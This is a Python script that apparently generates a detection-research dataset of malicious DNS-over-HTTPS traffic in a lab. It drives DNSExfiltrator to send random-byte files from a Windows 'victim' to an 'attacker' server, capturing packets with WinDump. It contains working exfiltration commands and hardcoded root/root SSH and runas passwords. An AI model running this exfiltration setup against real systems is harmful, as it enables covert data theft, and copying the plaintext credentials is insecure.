#!/usr/bin/env python3

"""Malicious DoH traffic dataset generator using Exfiltration with 
DNSExfiltrator tool

This script allows the user to launch and manage the production of a dataset 
containing Exfiltration communications between a client machine (victim) 
and a server machine (attacker), using the DNSExfiltrator tool. 

These communications pass through an intermediate DNS resolver, where 
communications between the client and the resolver are encrypted using the 
DNS-over-HTTPS protocol, thanks to the use of a DoH proxy named "doh-proxy" 
(https://github.com/facebookarchive/doh-proxy).

This script requires `Fabric` to be installed in the Python environment in 
which you are running it.

This script also requires the `constants.py` and `utils.py` files to be in the 
same directory.

This script contains the DnscatDataset class with the following functions:
    * __init__
    * load_config - Load dataset generation configurations.
    * run - Run the entire process of the dataset production.
    * reset - Kill all the processes related to the DNSCat2 tool 
        and the proxy on client and server.
    * run_server - Run the server part of DNSCat2.
    * run_proxy - Run the DoH proxy on the machine where it is installed.
    * run_windump - Run Windump on the client machine (victim) to capture the 
        DoH traffic between the DoH proxy and the DoH resolver.
    * run_scenario - Executes the scenario passed in parameter containing the 
        data production configuration for one communication.
"""

import os
import json
import time
import datetime
import logging
import random
import signal
import socket

from fabric import Connection

import constants
from utils import *


class DnsexfiltratorDataset:

    def __init__(self):
        """
        Parameters
        ----------
        server_conn: fabric.Connection 
            Object from Fabric library allowing the connection to the server
            machine (attacker) in SSH.
        local_ip_doh_proxy: list of str
            List of the IP addresses of the DoH proxies on the client machines
            (victims)
        local_ip_resolver: str
            IP address of the Local DoH resolver
        scenarios: list[dict]
            List of JSON objects in dictionnary form describing the dataset 
            generation configurations
        server_socket: str
            Socket name of the server side process of DNSCat2
        """

        self.STOP = False
        signal.signal(signal.SIGINT, self.interrupt_handler)

        logging_filename = 'dnsexfiltrator_dataset.log'
        logging_format = '%(asctime)s:%(levelname)s:%(funcName)s:%(message)s'
        logging_level = logging.INFO

        self.logger = logging_configuration(logging_filename, logging_format, logging_level)
        
        try:
            self.server_conn = Connection('dohserver.local', user='root', connect_kwargs={'password': 'root'}) # Debian machine
        except Exception as e:
            self.logger.error(f"SSH connection to the server failed: {e}")
            return

        try:
            self.local_ip_doh_proxy = socket.gethostbyname('exfilClient.local')
            #self.local_ip_resolver = socket.gethostbyname('doh.local')
            self.local_ip_resolver = None
            
            self.logger.info('IPs of the DoH proxy and the resolver have been retrieved')

        except Exception as _:
            self.logger.error('DoH proxy and/or resolver unreachable')

        self.scenarios = None # list of scenarios initiated at None
        self.server_socket = ''

    def interrupt_handler(self, sig, frame):
        self.logger.warning('Received SIGINT (CTRL+C). Stopping the execution gracefully')
        self.STOP = True

    def load_config(self, config_file_path):
        """Load the json file containing the scenarios
        
        Parameters
        ----------
        file_path: str
            The file path of the JSON file to load
        """

        scenario_filename, _ = os.path.splitext(config_file_path)

        with open(config_file_path) as json_file:
            try:
                self.scenarios = json.load(json_file)
                self.logger.info('Scenario JSON loaded:' + scenario_filename)
            except ValueError as e:
                self.logger.error('Invalid JSON: %s' % e)
                return

    def run(self):
        """Run the entire process of the dataset production"""

        # Verify if the JSON file has been loaded, else stop the program
        if self.scenarios is None:
            self.logger.error('The file containing scenarios has not been loaded !')
            return
                
        # Call the `reset` function to kill all processes from tools
        self.reset()

        # While the STOP variable is not set to TRUE thanks to CTRL+C keyboard 
        # command, the loop will continue.
        # Allow to not interrupt the process brutally
        
        while not self.STOP:
            scenario = random.choice(self.scenarios)
            self.run_scenario(scenario)
    
    def reset(self):
        """Kill all the processes related to the tool and the proxy on client 
        and server
        """

        # Kill the DoH proxy process
        os.system('powershell -c echo "notroot" | runas /netonly /user:Client "taskkill /IM doh-stub.exe /F"')
        # Kill specified processed on the server
        kill_all_processes(self.server_conn)

        self.logger.info('All processes have been stopped')
        print('All processes have been stopped\n')

    def run_server(self, extra_args=None):
        """Run the server part of the tool on the attacker machine in background 
        and keep the socket created in the variable self.server_socket. This 
        socket allows to communicate with the tool in background with the 
        `dtach` library.

        Parameters
        ----------
        extra_args: str, optional
            Extra arguments which could be added to the executed command of the
            server side of the tool
        """

        self.logger.info('Run server')
        extra_args = extra_args or ''
        
        command = 'conda activate {}'.format(constants.ENV_SERVER)
        command_to_run = 'bash -c "{}"'.format(command)
        self.server_conn.run(command_to_run)

        # Call the `run_background` function to run in background the server
        # side process of the tool. We get a socket to communicate later with
        self.server_socket = run_background(self.server_conn, '{py_path}/python {pwd}/dnsexfiltrator.py -d {domain} -p {password}'.format(
                                            py_path = '/root/anaconda3/envs/{}/bin'.format(constants.ENV_SERVER) ,
                                            pwd = constants.NS_DNSEXFILTRATOR_PATH, 
                                            domain = constants.DOMAIN,
                                            password = constants.PASSWORD_KEY,
                                            extra_args = extra_args),
                                            socket_name = constants.NS_DNSEXFILTRATOR_SOCKETNAME)
        
        self.logger.info('Server runned successfully')
        print('Server runned successfully')
    
    def run_proxy(self, domain, extra_args=None):
        """Run the DoH proxy on the machine where it is installed.
        
        Run the DoH proxy in background by using the anaconda environment 
        created for the proxy (see environment documentation to create the 
        anaconda environment).

        Parameters
        ----------
        domain: str
            Domain name of the DoH resolver to which to address the requests
        extra_args: str, optional
            Extra arguments which could be added to the executed command of the
            proxy (example: a SSL certificate)
        """

        self.logger.info('Run DoH proxy')

        # Run in background the DoH proxy process in a Windows machine.
        return_code = os.system('start /b {pwd}\\conda.bat run -n {env} doh-stub --listen-address {listen_address} --listen-port {listen_port} --domain {domain} {extra_args}  > nul 2>&1'.format(
                    pwd = constants.WIN_CONDA_PATH,
                    env = constants.ENV_PROXY,
                    listen_address = self.local_ip_doh_proxy,
                    listen_port = constants.WIN_LISTEN_PORT_PROXY,
                    domain = domain,
                    extra_args = extra_args))
        
        if return_code == 0:
            self.logger.info('DoH proxy runned successfully')
            print('DoH Proxy runned successfully')
        else:
            self.logger.error(f'Error when running the DoH proxy. Return code: {return_code}')
    
    def run_windump(self, output_folder, scenario):
        """Run tcpdump on the client machine (victim) to capture the DoH 
        traffic between the DoH proxy and the DoH resolver.

        Parameters
        ----------
        output: str
            Path where to save the PCAP file containing packets data of the DoH 
            communications
        """
        random.seed(int(time.time()))

        formated_date = str(datetime.datetime.now().strftime("%Y%m%d_%H_%M_%S"))
        extension = '.pcap'
        label = scenario['label']

        random_throttle_time = random.choice(scenario['throttleTime'])
        random_request_size = random.choice(scenario['requestMaxSize'])
        random_exfiltrated_file_size = random.randint(scenario['file_exfiltrated_size_limit'][0], scenario['file_exfiltrated_size_limit'][1])

        delay = 'delay' + str(random_throttle_time)
        request_max_size = 'reqsize' + str(random_request_size)
        exfiltrated_file_size = str(random_exfiltrated_file_size) + 'bytes'

        output_file = "_".join([label, delay, request_max_size, exfiltrated_file_size, formated_date]) + extension
        path = output_folder + output_file 

        self.logger.info('Run capture process')
        # Run in background the Windump process in a Windows machine
        return_code = os.system('start /b {pwd}\\WinDump.exe -n -XX -s 0 -w {path} -i 1 host {local_ip} and host {resolver} and port 443'.format(
                    pwd = constants.DOWNLOADS_PATH,
                    path = path,
                    local_ip = self.local_ip_doh_proxy,
                    resolver = self.local_ip_resolver))
        print(self.local_ip_doh_proxy)
        print(self.local_ip_resolver)
        if return_code == 0:
            self.logger.info('Capture process runned successfully')
            print('Capture process runned successfully')
        else:
            self.logger.error(f'Error when running the capture process. Return code: {return_code}')
            return

        self.logger.info('Windump output is {}'.format(output_file))
        print('Windump output is {}'.format(output_file))
        

        return random_throttle_time, random_request_size, random_exfiltrated_file_size

    def run_client(self, throttle_time, request_max_size, exfiltrated_file_size):
        file_to_extract = f"'{constants.DNSEXFILTRATOR_FILE_PATH}'" # Add quotes to the string

        # Command allowing to create a file with the random size previously
        # defined and its execution
        create_random_file = 'powershell $out = new-object byte[] {file_size}; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes({file_path}, $out)'.format(
                        file_size = exfiltrated_file_size, 
                        file_path = file_to_extract)
        os.system(create_random_file)

        # Define the commands and run the self-made Powershell script allowing 
        # to run the exfiltration process of the file to the server machine 
        # (attacker)
        run_exfiltration_file = 'powershell {pwd}\\dnsexfiltratorScript.ps1 {file_path} {domain} {password} {server_IP} {throttle_time} {requestMaxSize}'.format(
                                                                pwd = constants.CLIENT_DNSEXFILTRATOR_PATH,
                                                                file_path = file_to_extract, 
                                                                domain = constants.DOMAIN, 
                                                                password = constants.PASSWORD_KEY, 
                                                                server_IP = self.local_ip_doh_proxy, 
                                                                throttle_time = throttle_time,
                                                                requestMaxSize = request_max_size)
        return_code = os.system(run_exfiltration_file)
        
        if return_code == 0:
            self.logger.info('Exfiltration process runned successfully')
        else:
            self.logger.error(f'Error when running the exfiltration process. Return code: {return_code}')
            return

    def run_scenario(self, scenario):
        """Executes the scenario passed in parameter containing the data 
        production configuration for one communication.

        The global scenario consists in running the server and the client part 
        of the tool and to exfiltrate a file with a random size.

        Parameters
        ----------
        scenario: dict
            Dictionary containing configuration information for a 
            communication's data production.
        """

        self.logger.info('Starting scenario [{}]'.format(scenario['label']))
        print('Starting scenario [{}]'.format(scenario['label']))

        self.local_ip_resolver = socket.gethostbyname(scenario['doh_resolver'])
        
        try:
            print('run server')
            self.run_server()
            time.sleep(3)
            
            print('run capture')
            throttle_time, request_max_size, exfiltrated_file_size = self.run_windump(constants.DNSEXFILTRATOR_PCAP_FILES_PATH, scenario)
            print('run proxy')
            self.run_proxy(scenario['doh_resolver'], scenario['proxy_args'])
            time.sleep(2)

            print('run client')
            self.run_client(throttle_time, request_max_size, exfiltrated_file_size)

        except Exception as _:
                self.logger.exception('Machines initialisation failed')
                self.reset()
                return

        time.sleep(2)
        
        # Call the `reset` function to kill all processes from tools
        self.reset()

        time.sleep(1) # Used to capture the last packets (RST)
        
        return_code = os.system('powershell -c echo "notroot" | runas /netonly /user:Client "taskkill /IM WinDump.exe /F"')
        
        if return_code == 0:
            self.logger.info('WinDump kill process runned successfully')
        else:
            self.logger.error(f'Error when running the WinDump kill process. Return code: {return_code}')
            return

        self.logger.info('End of the scenario')
        print("End of the scenario\n")



if __name__== "__main__":
    dataset = DnsexfiltratorDataset()
    dataset.load_config('local_dnsexfiltrator_scenarios.json')
    dataset.run()
